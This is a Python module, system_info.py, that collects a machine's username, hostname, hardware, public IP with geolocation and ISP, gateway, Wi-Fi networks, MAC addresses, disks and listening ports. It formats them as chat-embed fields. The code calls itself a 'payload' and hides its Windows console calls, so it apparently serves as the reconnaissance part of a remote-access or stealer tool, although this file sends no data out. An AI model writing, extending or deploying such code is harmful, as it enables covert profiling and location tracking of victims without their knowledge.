# system_info.py
import platform
import psutil
import socket
import requests
import getpass
import os
import re
import subprocess
import traceback

IS_WINDOWS = platform.system() == "Windows"
WMI_MODULE = None
if IS_WINDOWS:
    try:
        import wmi
        WMI_MODULE = wmi
    except ImportError:
        pass

# --- Helper Functions (remain mostly the same) ---
def get_size(bytes_val, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if bytes_val < factor:
            return f"{bytes_val:.2f}{unit}{suffix}"
        bytes_val /= factor
    return f"{bytes_val:.2f}P{suffix}"

def get_cpu_frequency_str():
    try:
        freq = psutil.cpu_freq()
        if freq:
            current = f"{freq.current:.0f} MHz" if freq.current and freq.current > 0 else "N/A"
            max_f = f"{freq.max:.0f} MHz" if freq.max and freq.max > 0 else "N/A"
            return f"Current: {current} (Max: {max_f})"
    except Exception: return "N/A (Error)"
    return "N/A"

def get_gpu_info_str(): # Renamed for clarity, returns string
    if IS_WINDOWS and WMI_MODULE:
        try:
            gpus = [gpu.Name for gpu in WMI_MODULE.Win32_VideoController() if gpu.Name]
            return ", ".join(gpus) if gpus else "N/A (WMI: No GPU name)"
        except Exception: return "N/A (WMI Error)"
    elif platform.system() == "Linux":
        try:
            for cmd in ["lspci -vnn | grep -i vga | awk -F': ' '/VGA compatible controller/ {print $2}'",
                        "lspci | grep -i --color 'vga\\|3d\\|display' | awk -F': ' '{print $3}'"]:
                process = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=3, check=False)
                if process.returncode == 0 and process.stdout.strip():
                    return process.stdout.strip().splitlines()[0]
            return "N/A (lspci query failed)"
        except Exception: return "N/A (lspci error or not found)"
    return "N/A (GPU info platform specific)"

# --- Modular Information Gathering Functions ---

def get_overview_info():
    """Gathers System Overview information."""
    fields = []
    try:
        hostname = socket.gethostname()
        try:
            username = getpass.getuser()
        except:
            username = os.environ.get("USERNAME") or os.environ.get("USER", "N/A")

        os_info_obj = platform.uname()
        os_name_str = f"{os_info_obj.system} {os_info_obj.release}"
        if IS_WINDOWS:
            try:
                win_ver = platform.win32_ver()
                os_name_str = f"Windows {win_ver[0]} (Build {win_ver[1]}) {win_ver[2]}" if win_ver[1] else f"Windows {win_ver[0]} {win_ver[2]}"
            except:
                os_name_str = f"{os_info_obj.system} {os_info_obj.version}" # Fallback
        arch = os_info_obj.machine

        overview_value = (
            f"**User:** `{username}`\n"
            f"**Hostname:** `{hostname}`\n"
            f"**OS:** {os_name_str}\n"
            f"**Architecture:** {arch}"
        )
        fields.append({"name": "🖥️ System Overview", "value": overview_value, "inline": False})
    except Exception as e:
        fields.append({"name": "🖥️ System Overview Error", "value": f"{str(e)[:100]}", "inline": False})
    return fields

def get_hardware_specs_info():
    """Gathers Hardware Specifications."""
    fields = []
    try:
        hardware_parts = [
            f"**CPU:** {platform.processor() if platform.processor() else 'N/A'}",
            f"  Cores: {psutil.cpu_count(logical=False)}P / {psutil.cpu_count(logical=True)}L, Freq: {get_cpu_frequency_str()}",
            f"**RAM:** {get_size(psutil.virtual_memory().total)} Total, {get_size(psutil.virtual_memory().available)} Avail. ({psutil.virtual_memory().percent}%)",
            f"**GPU(s):** {get_gpu_info_str()}"
        ]
        fields.append({"name": "⚙️ Hardware Specs", "value": "\n".join(hardware_parts), "inline": False})
    except Exception as e:
        fields.append({"name": "⚙️ Hardware Specs Error", "value": f"{str(e)[:100]}", "inline": False})
    return fields

def get_network_connectivity_info():
    """Gathers public IP, GeoLocation, Gateway, Connected Wi-Fi."""
    fields = []
    try:
        public_ip_info = "N/A"
        try:
            response = requests.get("https://ipapi.co/json/", timeout=7)
            response.raise_for_status()
            geo_data = response.json()
            public_ip_info = (
                f"**Public IP:** `{geo_data.get('ip', 'N/A')}`\n"
                f"  **Location:** {geo_data.get('city', 'N/A')}, {geo_data.get('region_code', 'N/A')} ({geo_data.get('country_name', 'N/A')})\n"
                f"  **ISP:** {geo_data.get('org', 'N/A')}"
            )
        except Exception as e_ip:
            public_ip_info = f"**Public IP/Geo:** Error ({type(e_ip).__name__})"

        # --- Default Gateway ---
        gateway = "N/A"
        try:
            if IS_WINDOWS:
                process = subprocess.run("powershell -Command \"(Get-NetRoute -DestinationPrefix '0.0.0.0/0' | Sort-Object -Property RouteMetric | Select-Object -First 1).NextHop\"", capture_output=True, text=True, timeout=5, shell=True, check=False, creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0)
                if process.returncode == 0 and process.stdout.strip(): gateway = process.stdout.strip()
                else:
                    process_route = subprocess.run("route print -4 0.0.0.0", capture_output=True, text=True, timeout=5, shell=True, check=False, creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0)
                    match = re.search(r"Gateway\s*:\s*(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", process_route.stdout, re.IGNORECASE)
                    if match: gateway = match.group(1)
            elif platform.system() == "Linux":
                process = subprocess.run("ip route show default", shell=True, capture_output=True, text=True, timeout=5, check=False)
                match = re.search(r"default via (\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})", process.stdout)
                if match: gateway = match.group(1)
        except Exception: gateway = "N/A (Error)"

        # --- Connected Wi-Fi SSID ---
        ssid = "N/A (Not Windows/Linux or Error)"
        try:
            if IS_WINDOWS:
                output = subprocess.check_output("netsh wlan show interfaces", shell=True, text=True, errors='ignore', timeout=5, creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0)
                match = re.search(r"^\s*SSID\s*:\s*(.+)$", output, re.MULTILINE)
                if match:
                    ssid_val = match.group(1).strip()
                    ssid = ssid_val if ssid_val and "not associated" not in ssid_val.lower() else "Not Connected"
                else: ssid = "Not Connected (No SSID found)"
            elif platform.system() == "Linux":
                output = subprocess.check_output("iwgetid -r", shell=True, text=True, errors='ignore', timeout=5)
                ssid = output.strip() if output.strip() else "Not Connected"
        except subprocess.CalledProcessError: ssid = "Not Connected"
        except Exception: ssid = "N/A (Wi-Fi off or error)"

        network_connectivity_parts = [
            public_ip_info,
            f"**Default Gateway:** `{gateway}`",
            f"**Connected Wi-Fi:** `{ssid}`"
        ]
        fields.append({"name": "🌍 Network Connectivity", "value": "\n".join(network_connectivity_parts), "inline": False})
    except Exception as e:
        fields.append({"name": "🌍 Network Connectivity Error", "value": f"{str(e)[:100]}", "inline": False})
    return fields

def get_active_interfaces_info(): # Now returns fields
    """Gathers Active Network Interfaces & IP Addresses."""
    fields = []
    interface_details_str = [] # Store string parts for value
    try:
        if_addrs = psutil.net_if_addrs()
        for interface_name, interface_addresses in if_addrs.items():
            if "loopback" in interface_name.lower() or "lo" == interface_name.lower() or "virtual" in interface_name.lower():
                continue
            ipv4_addrs, ipv6_addrs, mac_address = [], [], "N/A"
            for addr in interface_addresses:
                if addr.family == socket.AF_INET: ipv4_addrs.append(addr.address)
                elif addr.family == socket.AF_INET6 and not addr.address.lower().startswith(("fe80::", "::1")):
                    ipv6_addrs.append(addr.address)
                elif addr.family == psutil.AF_LINK: mac_address = addr.address.upper()
            if ipv4_addrs or ipv6_addrs:
                detail_parts = [f"**Interface:** `{interface_name}`"]
                if mac_address != "N/A": detail_parts.append(f"  **MAC:** `{mac_address}`")
                if ipv4_addrs: detail_parts.append(f"  **IPv4:** `{', '.join(ipv4_addrs)}`")
                if ipv6_addrs: detail_parts.append(f"  **IPv6:** `{', '.join(ipv6_addrs)}`")
                interface_details_str.append("\n".join(detail_parts))
        
        if interface_details_str:
            fields.append({"name": "🛰️ Active Interfaces & IPs", "value": "\n\n".join(interface_details_str), "inline": False})
        else:
            fields.append({"name": "🛰️ Active Interfaces & IPs", "value": "No active interfaces with IP found.", "inline": False})
    except Exception as e:
        fields.append({"name": "🛰️ Active Interfaces Error", "value": f"Error: {str(e)[:60]}", "inline": False})
    return fields

def get_storage_info():
    """Gathers Disk Usage information."""
    disk_fields = []
    try:
        partitions = psutil.disk_partitions(all=False)
        for p_idx, partition in enumerate(partitions):
            if os.name == 'nt' and ('cdrom' in partition.opts or not partition.fstype):
                 continue
            if 'loop' in partition.device: continue

            try:
                usage = psutil.disk_usage(partition.mountpoint)
                device_name = partition.device.replace('\\', '').replace(':', '') if IS_WINDOWS else os.path.basename(partition.device)
                field_name = f"💾 Disk {p_idx+1} ({device_name})"
                field_value = (
                    f"Mount: `{partition.mountpoint}` ({partition.fstype})\n"
                    f"Total: {get_size(usage.total)}, Used: {get_size(usage.used)} ({usage.percent}%)\n"
                    f"Free: {get_size(usage.free)}"
                )
                disk_fields.append({"name": field_name, "value": f"```\n{field_value}\n```", "inline": True})
            except Exception as e_disk:
                disk_fields.append({"name": f"💾 Disk {p_idx+1} ({partition.device})", "value": f"```Error: {str(e_disk)[:30]}```", "inline": True})
    except Exception as e:
        disk_fields.append({"name": "💾 Disk Info Error", "value": f"Error fetching partitions: {str(e)[:50]}", "inline": False})
    
    if not disk_fields:
        disk_fields.append({"name": "💾 Disk Info", "value": "No partitions found or error.", "inline": False})
    return disk_fields

def get_misc_network_info():
    """Gathers listening ports and available Wi-Fi (can be noisy)."""
    fields = []
    misc_network_parts = []
    # Listening Ports
    try:
        conns = psutil.net_connections(kind='inet')
        listening_ports_str = "N/A"
        listening_ports = sorted(list(set(str(conn.laddr.port) for conn in conns if conn.status == psutil.CONN_LISTEN and conn.laddr and conn.laddr.port)), key=int)
        limit = 10
        if listening_ports:
            listening_ports_str = ", ".join(listening_ports[:limit]) + (f", ... ({len(listening_ports) - limit} more)" if len(listening_ports) > limit else "")
        else: listening_ports_str = "None found"
        misc_network_parts.append(f"**Listening Ports (TCP/UDP, sample):** `{listening_ports_str}`")
    except Exception: misc_network_parts.append("**Listening Ports:** `N/A (Error)`")

    # Available Wi-Fi
    available_ssids_str = "Scan N/A or Error"
    try:
        networks = ["Scan N/A or Error"]
        if IS_WINDOWS:
            output = subprocess.check_output("netsh wlan show networks", shell=True, text=True, errors='ignore', timeout=10, creationflags=subprocess.CREATE_NO_WINDOW if IS_WINDOWS else 0)
            found_ssids = re.findall(r"SSID \d+ : (.+)", output)
            networks = sorted(list(set(s.strip() for s in found_ssids))) if found_ssids else ["None detected or Wi-Fi off"]
        elif platform.system() == "Linux":
            output = subprocess.check_output("nmcli dev wifi list 2>/dev/null || iwlist scan 2>/dev/null | grep ESSID", shell=True, text=True, errors='ignore', timeout=15)
            found_ssids_set = set()
            for line in output.splitlines():
                if line.startswith("*") or line.startswith(" "):
                    parts = line.strip().split()
                    if len(parts) > 1 and parts[0] != "SSID" and parts[0] != "--":
                        potential_ssid = parts[0] if parts[0] != "*" else parts[1]
                        if not re.match(r"([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})", potential_ssid):
                            found_ssids_set.add(potential_ssid)
            essid_matches = re.findall(r'ESSID:"([^"]+)"', output)
            for essid in essid_matches: found_ssids_set.add(essid)
            networks = sorted(list(found_ssids_set)) if found_ssids_set else ["None detected or Wi-Fi off"]

        limit_ssid = 5
        if networks and "N/A" not in networks[0] and "Error" not in networks[0]:
            if len(networks) > limit_ssid: available_ssids_str = ", ".join(networks[:limit_ssid]) + f", ... ({len(networks)-limit_ssid} more)"
            else: available_ssids_str = ", ".join(networks)
        elif networks: available_ssids_str = networks[0]
        misc_network_parts.append(f"**Available Wi-Fi:** `{available_ssids_str}`")
    except Exception: misc_network_parts.append("**Available Wi-Fi:** `N/A (Error scanning)`")
    
    if misc_network_parts:
        fields.append({"name": "📡 Other Network Info", "value": "\n".join(misc_network_parts), "inline": False})
    return fields

def get_python_payload_version_info():
    """Gets the Python version used by the payload."""
    fields = []
    try:
        fields.append({"name": "🐍 Python (Payload)", "value": platform.python_version(), "inline": True})
    except: pass # Should not fail but be safe
    return fields


# --- Main Function (Now used for direct testing only) ---
if __name__ == '__main__':
    print("Testing System Info Modules (system_info.py direct run)...")
    print("-" * 60)
    if IS_WINDOWS and not WMI_MODULE: print("WARNING: WMI module not found, GPU info on Windows may be limited.")

    all_fields = []
    all_fields.extend(get_overview_info())
    all_fields.extend(get_hardware_specs_info())
    all_fields.extend(get_network_connectivity_info())
    all_fields.extend(get_active_interfaces_info())
    all_fields.extend(get_storage_info())
    all_fields.extend(get_misc_network_info()) # Optional, can be noisy
    all_fields.extend(get_python_payload_version_info())

    print(f"\nCollected {len(all_fields)} fields:")
    for field in all_fields:
        print(f"\n  --- {field['name']} ---")
        value_lines = field['value'].split('\n')
        for v_line in value_lines:
            print(f"    {v_line}")
        print(f"    Inline: {field.get('inline', False)}")
    print("-" * 60)